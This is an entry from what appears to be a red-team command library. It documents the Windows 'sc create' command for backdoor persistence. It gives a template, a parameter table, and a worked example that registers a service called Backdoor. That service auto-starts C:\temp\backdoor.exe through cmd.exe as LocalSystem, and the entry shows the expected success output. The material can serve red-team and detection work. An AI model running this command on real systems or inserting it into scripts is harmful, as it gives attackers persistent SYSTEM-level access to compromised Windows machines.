---
id: 2d4d3683-2dc3-40ba-a03b-54c084b5ccf4
name: create-backdoor-service-sc
type: command
executor: cmd
data: >-
  sc create $_SERVICE_NAME binpath= "$_EXEC_COMMAND" start= "$_STARTUP_TYPE"
  obj= "$_ACCOUNT"
output: null
created_at: '2023-04-06T03:56:28.095382+00:00'
updated_at: '2023-04-10T20:37:29.727924+00:00'
platforms:
  - Windows
tags:
  - persistence
  - service
verified: true
validated: true
---

# create-backdoor-service-sc

## Command

```cmd
sc create $_SERVICE_NAME binpath= "$_EXEC_COMMAND" start= "$_STARTUP_TYPE" obj= "$_ACCOUNT"
```

## Description

Creates a new Windows service using the sc utility, specifying the binary path (often wrapped in cmd.exe) for backdoor execution with elevated privileges.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_SERVICE_NAME | Service name (e.g., Backdoor) | Yes |
| binpath= $_EXEC_COMMAND | Execution command (e.g., cmd.exe /k C:\temp\backdoor.exe) | Yes |
| start= $_STARTUP_TYPE | Startup type (auto, demand, disabled) | Yes |
| obj= $_ACCOUNT | RunAs account (e.g., LocalSystem) | Yes |

## Examples

### Basic Usage

```cmd
sc create Backdoor binpath= "cmd.exe /k C:\temp\backdoor.exe" start= "auto" obj= "LocalSystem"
```

## Expected Output

[SC] CreateService SUCCESS

Indicates service registered in the registry.

## Related

- [[procedures/windows-elevated-services-backdoor-persistence]]
- [[commands/start-backdoor-service-sc]]
